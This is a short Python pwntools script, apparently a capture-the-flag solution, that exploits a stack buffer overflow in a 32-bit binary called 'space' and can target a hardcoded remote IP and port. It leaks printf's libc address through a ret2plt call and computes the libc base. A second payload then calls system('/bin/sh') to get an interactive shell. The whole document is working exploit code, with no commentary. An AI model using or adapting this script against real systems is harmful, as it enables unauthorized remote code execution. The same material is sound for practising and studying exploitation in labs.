from pwn import *

# b *vuln+29
gs = '''
b *vuln+42
continue
'''

elf = context.binary = ELF("./space")
libc = ELF("./libc6-i386_2.31-0ubuntu9.2_amd64.so")

def start():
    if args.REMOTE:
        return remote("83.136.254.37", 59014)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

offset = 18

payload = b"".join([
    b"C"*18,
    p32(elf.plt.printf),
    p32(elf.sym.main),
    p32(elf.got.printf)
])

io.sendlineafter("> ", payload)

leak = u32(io.recv(4))

print("[+] Leak Address: " + hex(leak))

libc.address = leak - libc.sym.printf

print("[+] Libc Base: " + hex(libc.address))

print("[+] System Address: " + hex(libc.sym.system))


payload = b"".join([
    b"C"*18,
    p32(libc.sym.system),
    p32(0x42424242),
    p32(next(libc.search(b"/bin/sh")))
])

io.sendlineafter("> ", payload)

io.interactive()